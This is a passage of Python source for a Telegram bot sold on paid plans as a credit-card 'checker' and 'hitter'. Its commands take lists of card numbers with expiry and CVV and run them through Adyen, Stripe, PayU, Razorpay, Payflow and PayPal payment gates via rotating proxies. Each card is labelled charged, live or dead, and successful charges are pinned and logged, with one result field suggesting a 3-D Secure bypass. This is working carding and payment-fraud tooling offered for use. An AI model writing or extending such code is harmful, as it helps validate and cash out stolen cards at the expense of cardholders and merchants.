                    lines.append(f"{pick(TIME_POOL)} <tg-spoiler>{c}</tg-spoiler> checking...")
            lines.append(f"\n{pick(FIRE_POOL)} {bold('Checked by:')} {user_name}")
            await safe_edit(status, "\n\n".join(lines))
            if rstatus == "charged":
                try:
                    await bot.pin_chat_message(message.chat.id, status.message_id, disable_notification=True)
                except Exception:
                    pass
                amt = result.get("amount_cents") or 0
                amt_str = f"{int(amt)/100:.2f}" if amt else "1.00"
                await send_log_hit((result.get("result_msg") or "Payment was successful")[:80], amt_str, "Stripe Checkout", user_name)
                break
            if result.get("session_dead"):
                break
    finally:
        _hit_active.discard(uid)


@router.message(Command("ady"))
async def cmd_ady(message: types.Message):
    if not await check_user_joined(message.from_user.id):
        await message.reply(JOIN_MSG, reply_markup=join_keyboard())
        return
    uid = message.from_user.id
    if auth.is_banned(uid):
        return
    if not has_active_plan(uid, message.chat.id):
        await message.reply(access_denied_msg(uid), reply_markup=access_denied_kb())
        return
    if uid in _adyen_active:
        await message.reply(f"{pick(FIRE_POOL)} {bold('Your Adyen check is already in progress!')}")
        return
    raw = message.text.split(maxsplit=1)[1] if " " in message.text else ""
    if message.reply_to_message:
        rt = message.reply_to_message.text or message.reply_to_message.caption or ""
        raw = (raw + "\n" + rt).strip() if raw else rt
    if not raw.strip():
        await message.reply(
            f"<code>[≡] {head('Adyen')} » {head('Pay-by-Link')} {pick(HEART_POOL)}\n"
            f"──────────────────\n"
            f"[≡] {head('Usage')} » /ady url cc|mm|yy|cvv\n"
            f"[≡] {head('Reply')} » {body('Reply to an Adyen link then /ady cards')}\n"
            f"[≡] {head('Example')} » /ady https://eu.adyen.link/... 4111|12|26|123</code>"
        )
        return
    link_match = re.search(r"https?://[^\s]+adyen[^\s]+", raw, re.IGNORECASE)
    if not link_match:
        await message.reply(f"{pick(CROSS_POOL)} {bold('No Adyen link found!')}")
        return
    link = link_match.group(0)
    ccs = []
    for m in CC_PATTERN.finditer(raw):
        cc = f"{m.group(1)}|{m.group(2)}|{m.group(3)}|{m.group(4)}"
        if cc not in ccs:
            ccs.append(cc)
    if not ccs:
        await message.reply(f"{pick(CROSS_POOL)} {bold('No valid CCs found!')}")
        return
    ccs = ccs[:ADYEN_MAX]
    proxies = get_user_proxies(uid)
    if not proxies:
        await message.reply(f"{pick(CROSS_POOL)} {bold('No Proxy Set!')}\n\n{pick(HEART_POOL)} Adyen requires a proxy.\nUse: /proxy host:port:user:pass")
        return
    _adyen_active.add(uid)
    total = len(ccs)
    user_name = message.from_user.full_name or "Unknown"
    results = {}
    order = list(ccs)
    init_lines = [f"{pick(HEART_POOL)} {bold('Adyen Hitter')} [0/{total}]\n"]
    for c in ccs:
        init_lines.append(f"{pick(TIME_POOL)} <tg-spoiler>{c}</tg-spoiler> checking...")
    init_lines.append(f"\n{pick(FIRE_POOL)} {bold('Checked by:')} {user_name}")
    status = await message.reply("\n\n".join(init_lines))
    try:
        for cc in order:
            proxy = random.choice(proxies)
            try:
                r = await adyen_engine.process_payment(link, cc, proxy)
            except Exception as e:
                r = {"error": str(e)[:80], "cc": cc}
            pstatus = (r.get("payment_status") or "").lower()
            err = (r.get("error") or "").lower()
            three_d_ok = bool(r.get("3d_bypassed"))
            if three_d_ok or pstatus in ("authorised", "received", "pending"):
                line = f"{pick(GEM_POOL)} {bold('Charged / Success!')}"
                is_charged = True
            elif "challenge required" in err:
                line = f"{pick(CHECK_POOL)} {bold('3DS Challenge — Live')}"
                is_charged = False
            elif "insufficient" in pstatus or "insufficient" in err:
                line = f"{pick(CHECK_POOL)} {bold('Insufficient Funds')}"
                is_charged = False
            elif "cvc" in pstatus or "cvc" in err:
                line = f"{pick(CHECK_POOL)} {bold('Incorrect CVC — Live')}"
                is_charged = False
            elif pstatus in ("refused", "cancelled", "declined") or "declined" in err:
                line = f"{pick(CROSS_POOL)} {bold('Declined')}"
                is_charged = False
            elif "not active" in err or "expired" in err:
                line = f"{pick(CROSS_POOL)} {bold('Checkout Expired')}"
                is_charged = False
            else:
                line = f"{pick(FIRE_POOL)} {bold(((r.get('payment_status') or r.get('error') or 'Unknown')[:55]))}"
                is_charged = False
            results[cc] = r
            results[cc]["_line"] = line
            lines = [f"{pick(HEART_POOL)} {bold('Adyen Hitter')} [{sum(1 for c in order if c in results)}/{total}]\n"]
            for c in order:
                if c in results:
                    lines.append(f"{results[c]['_line']}\n{pick(GEM_POOL)} <tg-spoiler>{c}</tg-spoiler>")
                else:
                    lines.append(f"{pick(TIME_POOL)} <tg-spoiler>{c}</tg-spoiler> checking...")
            lines.append(f"\n{pick(FIRE_POOL)} {bold('Checked by:')} {user_name}")
            await safe_edit(status, "\n\n".join(lines))
            if is_charged:
                try:
                    await bot.pin_chat_message(message.chat.id, status.message_id, disable_notification=True)
                except Exception:
                    pass
                amt = r.get("amount")
                amt_str = f"{float(amt)/100:.2f}" if isinstance(amt, (int, float)) else "1.00"
                await send_log_hit((r.get("payment_status") or "Authorised"), amt_str, f"Adyen · {r.get('merchant_name') or '-'}", user_name)
                break
    finally:
        _adyen_active.discard(uid)


# ── PROXY ────────────────────────────────────────────────────────────────────
async def test_proxy_detailed(proxy_url):
    try:
        ok, ip_or_err, rotation = await test_proxy(proxy_url)
        return {"success": bool(ok), "error": None if ok else str(ip_or_err)[:100], "ip": ip_or_err if ok else None, "rotation": rotation if ok else None}
    except Exception as e:
        return {"success": False, "error": str(e)[:100]}


@router.message(Command("proxy"))
async def cmd_proxy(message: types.Message):
    if not await check_user_joined(message.from_user.id):
        await message.reply(JOIN_MSG, reply_markup=join_keyboard())
        return
    uid = message.from_user.id
    if auth.is_banned(uid):
        return
    if not has_active_plan(uid, message.chat.id):
        await message.reply(access_denied_msg(uid), reply_markup=access_denied_kb())
        return
    raw = ""
    args = message.text.split(maxsplit=1)
    if len(args) >= 2:
        raw = args[1]
    if message.reply_to_message:
        rt = message.reply_to_message.text or message.reply_to_message.caption or ""
        raw = (raw + "\n" + rt).strip() if raw else rt
        if message.reply_to_message.document:
            doc = message.reply_to_message.document
            if doc.file_name and doc.file_name.lower().endswith(".txt"):
                try:
                    buf = BytesIO()
                    await bot.download(doc.file_id, destination=buf)
                    buf.seek(0)
                    ft = buf.read().decode("utf-8", errors="ignore")
                    raw = (raw + "\n" + ft).strip() if raw else ft
                except Exception:
                    pass
    if not raw.strip():
        await message.reply(
            f"{pick(FIRE_POOL)} {bold('Usage:')}\n\n"
            f"/proxy host:port:user:pass\n/proxy host:port\n/proxy socks5://user:pass@host:port\n\n"
            f"{bold('Or reply to a .txt file with proxies')}\nMax {MAX_PROXIES_PER_USER} per user."
        )
        return
    parsed, failed = [], 0
    for line in raw.strip().splitlines():
        line = line.strip()
        if not line:
            continue
        p = parse_proxy_format(line)
        if p:
            parsed.append(p)
        else:
            failed += 1
    if not parsed:
        await message.reply(f"{pick(CROSS_POOL)} {bold('No valid proxies found!')}")
        return
    need = MAX_PROXIES_PER_USER - len(get_user_proxies(uid))
    if need <= 0:
        await message.reply(f"{pick(FIRE_POOL)} {bold('Proxy list full!')} /rmproxy {bold('to clear.')}")
        return
    status = await message.reply(f"{pick(TIME_POOL)} {bold('Testing proxies...')}\n\nParsed: {len(parsed)} · Testing in batches of 10")
    working, dead = [], 0
    for i in range(0, len(parsed), 10):
        if len(working) >= need:
            break
        batch = parsed[i:i + 10]
        async def _t(p):
            try:
                r = await test_proxy_detailed(p["proxy_url"])
                return p if r.get("success") else None
            except Exception:
                return None
        rs = await asyncio.gather(*[_t(p) for p in batch])
        for r in rs:
            if r is not None and len(working) < need:
                working.append(r)
            elif r is None:
                dead += 1
        await safe_edit(status, f"{pick(TIME_POOL)} {bold('Testing proxies...')}\n\nWorking: {len(working)}/{need}\nDead: {dead}\nTested: {min(i+10, len(parsed))}/{len(parsed)}")
    if not working:
        await safe_edit(status, f"{pick(CROSS_POOL)} {bold('All proxies are dead!')}")
        return
    add_user_proxies(uid, working)
    total = len(get_user_proxies(uid))
    await safe_edit(status, f"{pick(CHECK_POOL)} {bold('Proxy Testing Complete!')}\n\nWorking: {len(working)}\nDead: {dead}\n" + (f"Parse failed: {failed}\n" if failed else "") + f"Total saved: {total}/{MAX_PROXIES_PER_USER}\n\n{pick(FIRE_POOL)} Random proxy used per check.")


@router.message(Command("myproxy"))
async def cmd_myproxy(message: types.Message):
    if not await check_user_joined(message.from_user.id):
        await message.reply(JOIN_MSG, reply_markup=join_keyboard())
        return
    if not has_active_plan(message.from_user.id, message.chat.id):
        await message.reply(access_denied_msg(message.from_user.id), reply_markup=access_denied_kb())
        return
    lst = get_user_proxies(message.from_user.id)
    if not lst:
        await message.reply(f"{pick(CROSS_POOL)} {bold('No Proxies Set!')} /proxy")
        return
    lines = [f"{pick(FIRE_POOL)} {bold('Your Proxies')} [{len(lst)}/{MAX_PROXIES_PER_USER}]\n"]
    for i, p in enumerate(lst[:10], 1):
        lines.append(f"{i}. {p.get('ip','-')}:{p.get('port','-')} ({p.get('type','http').upper()})")
    if len(lst) > 10:
        lines.append(f"... +{len(lst)-10} more")
    await message.reply("\n".join(lines))


@router.message(Command("rmproxy"))
async def cmd_rmproxy(message: types.Message):
    if not await check_user_joined(message.from_user.id):
        await message.reply(JOIN_MSG, reply_markup=join_keyboard())
        return
    lst = get_user_proxies(message.from_user.id)
    if not lst:
        await message.reply(f"{pick(FIRE_POOL)} {bold('No proxies to remove!')}")
        return
    n = len(lst)
    del_user_proxy(message.from_user.id)
    await message.reply(f"{pick(CHECK_POOL)} {bold('All')} {n} {bold('proxies removed!')}")


# ── SINGLE GATES ─────────────────────────────────────────────────────────────
def _gate_result_text(cc, gate_name, status_raw, response_text, bin_info, user):
    s = (status_raw or "").lower()
    if s == "charged":
        status_emoji, status_text = "✅", "𝐂𝐡𝐚𝐫𝐠𝐞𝐝"
    elif s == "approved":
        status_emoji, status_text = "🔥", "𝐋𝐢𝐯𝐞"
    else:
        status_emoji, status_text = "❌", "𝐃𝐞𝐚𝐝"
    return _shopiii_result_text(cc, status_emoji, status_text, str(response_text), gate_name, "-", bin_info)


async def _handle_gate_result(message, loading_msg, cc, gate_name, status_raw, response_text, user):
    bin_info = {}
    try:
        bin_info = await bin_lookup(cc.split("|")[0][:6])
    except Exception:
        pass
    await safe_edit(loading_msg, _gate_result_text(cc, gate_name, status_raw, response_text, bin_info, user))
    if (status_raw or "").lower() == "charged":
        try:
            await bot.pin_chat_message(message.chat.id, loading_msg.message_id, disable_notification=True)
        except Exception:
            pass
        await send_log_hit(str(response_text)[:80], "-", gate_name, user.full_name or "Unknown")


def _extract_gate_cc(message):
    cc = None
    args = message.text.split(maxsplit=1)
    if len(args) >= 2:
        cc = extract_cc(args[1])
        if not cc:
            parts = re.split(r"[|/]", args[1].strip())
            if len(parts) >= 4:
                cc = "|".join(p.strip() for p in parts[:4])
    if not cc and message.reply_to_message:
        rt = message.reply_to_message.text or message.reply_to_message.caption or ""
        cc = extract_cc(rt)
    return cc


@router.message(Command("payu"))
async def cmd_payu(message: types.Message):
    if not await check_user_joined(message.from_user.id):
        await message.reply(JOIN_MSG, reply_markup=join_keyboard())
        return
    uid = message.from_user.id
    if auth.is_banned(uid):
        return
    if not has_active_plan(uid, message.chat.id):
        await message.reply(access_denied_msg(uid), reply_markup=access_denied_kb())
        return
    cc = _extract_gate_cc(message)
    if not cc:
        await message.reply(f"{pick(FIRE_POOL)} {bold('No CC found!')}\n\n{bold('Usage:')} /payu 4388540109154632|03|2030|815")
        return
    loading = await message.reply(_shopiii_checking_text(cc))
    try:
        processor = _payu_mod.PayUProcessor()
        try:
            result = await asyncio.get_running_loop().run_in_executor(CHECKER_POOL, processor.process, cc)
        finally:
            try:
                processor.cleanup()
            except Exception:
                pass
    except Exception as e:
        log.error("payu error: %s", e, exc_info=True)
        await safe_edit(loading, f"{pick(CROSS_POOL)} {bold('PayU Error')}\n\n{body(str(e)[:100])}")
        return
    status = (result.get("status") or "").lower()
    response_text = result.get("value") or result.get("code") or "Unknown"
    await _handle_gate_result(message, loading, cc, "PayU 1$", status, response_text, message.from_user)


@router.message(Command("rz"))
async def cmd_rz(message: types.Message):
    if not await check_user_joined(message.from_user.id):
        await message.reply(JOIN_MSG, reply_markup=join_keyboard())
        return
    uid = message.from_user.id
    if auth.is_banned(uid):
        return
    if not has_active_plan(uid, message.chat.id):
        await message.reply(access_denied_msg(uid), reply_markup=access_denied_kb())
        return
    cc = _extract_gate_cc(message)
    if not cc:
        await message.reply(f"{pick(FIRE_POOL)} {bold('No CC found!')}\n\n{bold('Usage:')} /rz 4388540109154632|03|2030|815")
        return
    loading = await message.reply(_shopiii_checking_text(cc))
    try:
        result = await _rz_mod.check_gate(cc)
    except Exception as e:
        log.error("rz error: %s", e, exc_info=True)
        await safe_edit(loading, f"{pick(CROSS_POOL)} {bold('Razorpay Error')}\n\n{body(str(e)[:100])}")
        return
    status = (result.get("status") or "").lower()
    response_text = result.get("response") or "Unknown"
    await _handle_gate_result(message, loading, cc, "Razorpay 1₹", status, response_text, message.from_user)


@router.message(Command("pf"))
async def cmd_pf(message: types.Message):
    if not await check_user_joined(message.from_user.id):
        await message.reply(JOIN_MSG, reply_markup=join_keyboard())
        return
    uid = message.from_user.id
    if auth.is_banned(uid):
        return
    if not has_active_plan(uid, message.chat.id):
        await message.reply(access_denied_msg(uid), reply_markup=access_denied_kb())
        return
    cc = _extract_gate_cc(message)
    if not cc:
        await message.reply(f"{pick(FIRE_POOL)} {bold('No CC found!')}\n\n{bold('Usage:')} /pf 4388540109154632|03|2030|815")
        return
    parts = cc.split("|")
    if len(parts) != 4:
        await message.reply(f"{pick(CROSS_POOL)} {bold('Invalid CC format!')}")
        return
    cc_num, mm, yy, cvv = parts
    loading = await message.reply(_shopiii_checking_text(cc))
    try:
        result = await asyncio.get_running_loop().run_in_executor(CHECKER_POOL, _pf_mod.process_card, cc_num, mm, yy, cvv)
    except Exception as e:
        log.error("pf error: %s", e, exc_info=True)
        await safe_edit(loading, f"{pick(CROSS_POOL)} {bold('Payflow Error')}\n\n{body(str(e)[:100])}")
        return
    status = (result.get("status") or "").lower()
    response_text = result.get("response") or "Unknown"
    await _handle_gate_result(message, loading, cc, "Payflow 5$", status, response_text, message.from_user)


@router.message(Command("pp"))
async def cmd_pp(message: types.Message):
    if not await check_user_joined(message.from_user.id):
        await message.reply(JOIN_MSG, reply_markup=join_keyboard())
        return
    uid = message.from_user.id
    if auth.is_banned(uid):
        return
    if not has_active_plan(uid, message.chat.id):
        await message.reply(access_denied_msg(uid), reply_markup=access_denied_kb())
        return
    cc = _extract_gate_cc(message)
    if not cc:
        await message.reply(f"{pick(FIRE_POOL)} {bold('No CC found!')}\n\n{bold('Usage:')} /pp 4388540109154632|03|2030|815")
        return
    loading = await message.reply(_shopiii_checking_text(cc))
    try:
        result = await _pp_mod.check_gate(cc)
    except Exception as e:
        log.error("pp error: %s", e, exc_info=True)
        await safe_edit(loading, f"{pick(CROSS_POOL)} {bold('PayPal Error')}\n\n{body(str(e)[:100])}")
        return
    status = (result.get("status") or "").lower()
    response_text = result.get("response") or "Unknown"
    await _handle_gate_result(message, loading, cc, "PayPal 0.10$", status, response_text, message.from_user)# ══════════════════════════════════════════════════════════════════════════════
#  PART 6 — Plans, redeem, admin, broadcast, main
# ══════════════════════════════════════════════════════════════════════════════

@router.message(Command("myplan"))
async def cmd_myplan(message: types.Message):
    uid = message.from_user.id
    if auth.is_banned(uid):
        return
    try:
        role = auth.get_user_role(uid)
        expiry = auth.get_premium_expiry(uid)
    except Exception:
        role, expiry = "free", "N/A"
    role_disp = {"owner": "Owner", "admin": "Admin", "premium": "Premium"}.get(role, "Free")
    try:
        unlimited = auth.has_unlimited_checks(uid)
    except Exception:
        unlimited = role in ("owner", "admin", "premium")
    checks_line = "Unlimited" if unlimited else "Locked (redeem a key)"
    await message.reply(
        f"<code>[≡] {head('My Plan')} » {pick(GEM_POOL)}\n"
        f"──────────────────\n"
        f"[≡] {head('User')}    » {body(message.from_user.full_name or 'Unknown')} {pick(HEART_POOL)}\n"
        f"[≡] {head('ID')}      » {digit(str(uid))} {pick(LINK_POOL)}\n"
        f"[≡] {head('Role')}    » {body(role_disp)} {pick(CROWN_POOL)}\n"
        f"[≡] {head('Expires')} » {digit(expiry) if expiry != 'N/A' else body('—')} {pick(TIME_POOL)}\n"
        f"[≡] {head('Checks')}  » {body(checks_line)} {pick(STAR_POOL)}\n"
        f"──────────────────\n"
        f"[≡] {head('Redeem')} » /redeem KEY {pick(GIFT_POOL)}\n"
        f"[≡] {head('Owner')}  » {body(OWNER_NAME)} {pick(CROWN_POOL)}</code>"
    )


@router.message(Command("plans"))
async def cmd_plans(message: types.Message):
    await message.reply(
        f"<code>[≡] {head('Plans')} » {head('Access Plans')} {pick(GEM_POOL)}\n"
        f"──────────────────\n"
        f"[≡] {head('Trial')}     {body('Free')} {pick(GIFT_POOL)} · {body('3 Hours')} {pick(TIME_POOL)}\n"
        f"[≡] {head('Weekly')}    ${digit('10')} {pick(ROCKET_POOL)} · {digit('7')} {body('Days')} {pick(TIME_POOL)}\n"
        f"[≡] {head('Bi-Weekly')} ${digit('18')} {pick(STAR_POOL)} · {digit('15')} {body('Days')} {pick(TIME_POOL)}\n"
        f"[≡] {head('Monthly')}   ${digit('30')} {pick(CROWN_POOL)} · {digit('30')} {body('Days')} {pick(TIME_POOL)}\n"
        f"──────────────────\n"
        f"[≡] {head('Checks')} » {body('Unlimited — no credit deduction')} {pick(SLOT_EMOJI_ID)}\n"
        f"──────────────────\n"
        f"[≡] {head('Redeem')} » /redeem KEY {pick(GIFT_POOL)}\n"
        f"[≡] {head('Owner')}  » {body(OWNER_NAME)} {pick(CROWN_POOL)}</code>"
    )


@router.message(Command("redeem"))
async def cmd_redeem(message: types.Message):
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await message.reply(f"{pick(FIRE_POOL)} {bold('Usage:')} /redeem hqcumin-xxxxxxxx")
        return
    if auth.is_premium(message.from_user.id):
        await message.reply(f"{pick(CROSS_POOL)} {bold('You already have premium!')}")
        return
    ok, info = auth.redeem_key(message.from_user.id, args[1].strip())
    if ok:
        plan = info if not isinstance(info, dict) else (info.get("plan") or info.get("duration") or "Premium")
        try:
            expiry = auth.get_premium_expiry(message.from_user.id) or "—"
        except Exception:
            expiry = "—"
        await message.reply(
            f"<code>[≡] {head('Access Granted')} » {head('Key Redeemed')} {pick(CHECK_POOL)}\n"
            f"──────────────────\n"
            f"[≡] {head('Plan')}       » {body(plan)} {pick(TIME_POOL)}\n"
            f"[≡] {head('Checks')}     » {body('Unlimited')} {pick(STAR_POOL)}\n"
            f"[≡] {head('Expires')}    » {body(expiry)} {pick(TIME_POOL)}\n"
            f"──────────────────\n"
            f"[≡] /sh » {body('card|mm|yy|cvv')} {pick(STAR_POOL)}\n"
            f"[≡] /msh » {body('reply .txt file')} {pick(STAR_POOL)}\n"
            f"[≡] /hit » {body('url card|mm|yy|cvv')} {pick(STAR_POOL)}\n"
            f"[≡] /myplan » {body('check your plan')} {pick(TIME_POOL)}</code>"
        )
    else:
        await message.reply(f"{pick(CROSS_POOL)} {bold('Redemption Failed!')}\n\n{info}")


def _gen_hqcumin_key():
    alphabet = string.ascii_lowercase + string.digits
    return f"hqcumin-{''.join(random.choice(alphabet) for _ in range(8))}"


@router.message(Command("aadmin"))
async def cmd_aadmin(message: types.Message):
    if message.from_user.id != OWNER_ID:
        return
    args = message.text.split(maxsplit=1)
    if len(args) < 2 or not args[1].strip().lstrip("-").isdigit():
        await message.reply(f"{pick(FIRE_POOL)} {bold('Usage:')} /aadmin <user_id>")
        return
    target = int(args[1].strip())
    try:
        auth.add_admin(target)
    except Exception:
        pass
    await message.reply(f"{pick(CHECK_POOL)} {bold('Admin Added!')}\n\n{pick(GEM_POOL)} ID: {target}")


@router.message(Command("dadmin"))
async def cmd_dadmin(message: types.Message):
    if message.from_user.id != OWNER_ID:
        return
    args = message.text.split(maxsplit=1)
    if len(args) < 2 or not args[1].strip().lstrip("-").isdigit():
        await message.reply(f"{pick(FIRE_POOL)} {bold('Usage:')} /dadmin <user_id>")
        return
    target = int(args[1].strip())
    try:
        auth.remove_admin(target)
    except Exception:
        pass
    await message.reply(f"{pick(CHECK_POOL)} {bold('Admin Removed!')}\n\n{pick(CROSS_POOL)} ID: {target}")


@router.message(Command("admin"))
async def cmd_admin(message: types.Message):
    if message.from_user.id != OWNER_ID:
        return
    await message.reply(
        f"<code>[≡] {head('Owner')} » {head('Command List')} {pick(CROWN_POOL)}\n"
        f"──────────────────\n"
        f"[≡] {head('Admin Management')} {pick(LINK_POOL)}\n"
        f"[≡] /aadmin &lt;id&gt; » {body('Add admin')}\n"
        f"[≡] /dadmin &lt;id&gt; » {body('Remove admin')}\n"
        f"──────────────────\n"
        f"[≡] {head('User Management')} {pick(LINK_POOL)}\n"
        f"[≡] /ban &lt;id&gt; » {body('Ban user')}\n"
        f"[≡] /unban &lt;id&gt; » {body('Unban user')}\n"
        f"[≡] /auth &lt;id&gt; [days] » {body('Grant premium')}\n"
        f"[≡] /unauth &lt;id&gt; » {body('Remove premium')}\n"
        f"──────────────────\n"
        f"[≡] {head('Key Generation')} {pick(GIFT_POOL)}\n"
        f"[≡] /key users days max_uses » {body('Generate hqcumin- key')}\n"
        f"──────────────────\n"
        f"[≡] {head('Broadcast')} {pick(ROCKET_POOL)}\n"
        f"[≡] /broadcast &lt;text&gt; » {body('Send to all users')}\n"
        f"──────────────────\n"
        f"[≡] {head('Maintenance')} {pick(SLOT_EMOJI_ID)}\n"
        f"[≡] /maintain &lt;reason&gt; » {body('Block all users')}\n"
        f"[≡] /maintaingood » {body('Restore access')}\n"
        f"──────────────────\n"
        f"[≡] {body('Maintenance:')} {body('ACTIVE') if in_maintenance() else body('OFF')}</code>"
    )


@router.message(Command("ban"))
async def cmd_ban(message: types.Message):
    if not auth.is_admin(message.from_user.id):
        return
    args = message.text.split(maxsplit=1)
    if len(args) < 2 or not args[1].strip().lstrip("-").isdigit():
        await message.reply(f"{pick(FIRE_POOL)} {bold('Usage:')} /ban user-id")
        return
    auth.ban_user(int(args[1].strip()))
    await message.reply(f"{pick(CHECK_POOL)} {bold('User Banned!')}")


@router.message(Command("unban"))
async def cmd_unban(message: types.Message):
    if not auth.is_admin(message.from_user.id):
        return
    args = message.text.split(maxsplit=1)
    if len(args) < 2 or not args[1].strip().lstrip("-").isdigit():
        await message.reply(f"{pick(FIRE_POOL)} {bold('Usage:')} /unban user-id")
        return
    auth.unban_user(int(args[1].strip()))
    await message.reply(f"{pick(CHECK_POOL)} {bold('User Unbanned!')}")


@router.message(Command("auth"))
async def cmd_auth(message: types.Message):
    if not auth.is_admin(message.from_user.id):
        return
    args = message.text.split()
    if len(args) < 2 or not args[1].isdigit():
        await message.reply(f"{pick(FIRE_POOL)} {bold('Usage:')} /auth user-id [days]")
        return
    target = int(args[1])
    days = int(args[2]) if len(args) >= 3 and args[2].isdigit() else 0
    try:
        auth.auth_user(target, days=days, by=message.from_user.id)
    except Exception:
        pass
    exp = "Lifetime" if days == 0 else f"{days} days"
    await message.reply(f"{pick(CHECK_POOL)} {bold('Premium Granted!')}\nID: {target}\nPlan: {exp}")


@router.message(Command("unauth"))
async def cmd_unauth(message: types.Message):
    if not auth.is_admin(message.from_user.id):
        return
    args = message.text.split(maxsplit=1)
    if len(args) < 2 or not args[1].isdigit():
        await message.reply(f"{pick(FIRE_POOL)} {bold('Usage:')} /unauth user-id")
        return
    try:
        auth.unauth_user(int(args[1]))
    except Exception:
        pass
    await message.reply(f"{pick(CHECK_POOL)} {bold('Premium Removed!')}")


@router.message(Command("key"))
async def cmd_key(message: types.Message):
    if not auth.is_admin(message.from_user.id):
        return
    args = message.text.split()
    if len(args) < 4 or not all(a.isdigit() for a in args[1:4]):
        await message.reply(f"{pick(FIRE_POOL)} {bold('Usage:')} /key users days max_uses")
        return
    users, days, max_uses = int(args[1]), int(args[2]), int(args[3])
    key = _gen_hqcumin_key()
    try:
        if hasattr(auth, "register_key"):
            auth.register_key(key, users=users, days=days, max_uses=max_uses, by=message.from_user.id)
        else:
            auth.generate_keys(users, days, created_by=message.from_user.id)
    except Exception as e:
        log.warning("key registration failed: %s", e)
    plan_label = f"{days} Day" + ("s" if days != 1 else "")
    await message.reply(
        f"<code>[≡] {head('Key')} » {head('Generated')} {pick(SLOT_EMOJI_ID)}\n"
        f"──────────────────────\n"
        f"[≡] {head('Key')}       » <code>{key}</code> {pick(GEM_POOL)}\n"
        f"[≡] {head('Plan')}      » {body(plan_label)} {pick(GIFT_POOL)}\n"
        f"[≡] {head('Max Uses')}  » {digit(str(max_uses))} {pick(STAR_POOL)}\n"
        f"──────────────────────\n"
        f"[≡] {head('Redeem')} » /redeem KEY {pick(GIFT_POOL)}</code>"
    )


@router.message(Command("maintain"))
async def cmd_maintain(message: types.Message):
    if message.from_user.id != OWNER_ID:
        return
    args = message.text.split(maxsplit=1)
    reason = args[1].strip() if len(args) > 1 else "Scheduled maintenance"
    _maintenance.update({"active": True, "reason": reason, "by": message.from_user.id, "since": int(time.time())})
    _save_maintenance()
    await message.reply(f"{pick(FIRE_POOL)} {bold('Maintenance ON')}\n\n{pick(GEM_POOL)} Reason: {reason}")


@router.message(Command("maintaingood"))
async def cmd_maintaingood(message: types.Message):
    if message.from_user.id != OWNER_ID:
        return
    _maintenance.update({"active": False, "reason": "", "by": 0, "since": 0})
    _save_maintenance()
    await message.reply(f"{pick(CHECK_POOL)} {bold('Maintenance OFF')}")


@router.message(Command("broadcast", "broad"))
async def cmd_broadcast(message: types.Message):
    if message.from_user.id != OWNER_ID:
        return
    args = message.text.split(maxsplit=1)
    body_text = args[1].strip() if len(args) > 1 else ""
    src_msg = message.reply_to_message if message.reply_to_message else None
    if not body_text and not src_msg:
        await message.reply(f"{pick(FIRE_POOL)} {bold('Usage:')} /broadcast <text> or reply to a message")
        return
    try:
        user_ids = auth.get_all_user_ids()
    except Exception:
        user_ids = []
    if not user_ids:
        await message.reply(f"{pick(CROSS_POOL)} {bold('No users found.')}")
        return
    status = await message.reply(f"{pick(ROCKET_POOL)} {bold('Broadcasting...')}\n\nTotal: {len(user_ids)}")
    sent = failed = blocked = 0
    for uid in user_ids:
        try:
            if src_msg:
                await bot.copy_message(chat_id=uid, from_chat_id=src_msg.chat.id, message_id=src_msg.message_id)
            else:
                await bot.send_message(uid, body_text)
            sent += 1
        except TelegramForbiddenError:
            blocked += 1
        except TelegramRetryAfter as e:
            await asyncio.sleep(e.retry_after + 1)
            try:
                if src_msg:
                    await bot.copy_message(uid, src_msg.chat.id, src_msg.message_id)
                else:
                    await bot.send_message(uid, body_text)
                sent += 1
            except Exception:
                failed += 1
        except Exception:
            failed += 1
    await safe_edit(status, f"{pick(CHECK_POOL)} {bold('Broadcast Complete')}\n\nTotal: {len(user_ids)}\nSent: {sent}\nBlocked: {blocked}\nFailed: {failed}")


@router.message(F.text & ~F.text.startswith("/"))
async def handle_plain(message: types.Message):
    if message.chat.type != "private":
        return
    text = message.text or ""
    ccs = []
    for m in CC_PATTERN.finditer(text):
        cc = f"{m.group(1)}|{m.group(2)}|{m.group(3)}|{m.group(4)}"
        if cc not in ccs:
            ccs.append(cc)
    if not ccs:
        return
    if not await check_user_joined(message.from_user.id):
        await message.reply(JOIN_MSG, reply_markup=join_keyboard())
        return
    if not has_active_plan(message.from_user.id, message.chat.id):
        await message.reply(access_denied_msg(message.from_user.id), reply_markup=access_denied_kb())
        return
    if len(ccs) == 1:
        await message.reply(f"{pick(FIRE_POOL)} {bold('CC Detected!')}\n\n<tg-spoiler>{ccs[0]}</tg-spoiler>\n\nUse /sh to check it.")
    else:
        await message.reply(f"{pick(FIRE_POOL)} {bold(f'{len(ccs)} CCs Detected!')}\n\nUse /msh to mass check.")


# ══════════════════════════════════════════════════════════════════════════════
#  MAIN
# ══════════════════════════════════════════════════════════════════════════════

async def main():
    me = await bot.get_me()
    log.info(f"⚡ Bot @{me.username} running (P U S S Y build v8)...")
    if in_maintenance():
        log.warning("⚠ Maintenance mode is ACTIVE on startup")
    await bot.delete_webhook(drop_pending_updates=True)
    try:
        await dp.start_polling(
            bot, skip_updates=True,
            allowed_updates=["message", "edited_message", "callback_query",
                             "chat_member", "my_chat_member", "chat_join_request"],
        )
    finally:
        CHECKER_POOL.shutdown(wait=False)
        try:
            await close_session()
        except Exception:
            pass
        await bot.session.close()


if __name__ == "__main__":
    try:
        import resource
        soft, hard = resource.getrlimit(resource.RLIMIT_NOFILE)
        target = min(65536, hard)
        if soft < target:
            resource.setrlimit(resource.RLIMIT_NOFILE, (target, hard))
            log.info(f"📂 Raised fd limit: {soft} → {target}")
    except Exception:
        pass
    try:
        asyncio.run(main())
    except (KeyboardInterrupt, SystemExit):
        log.info("Bot stopped.")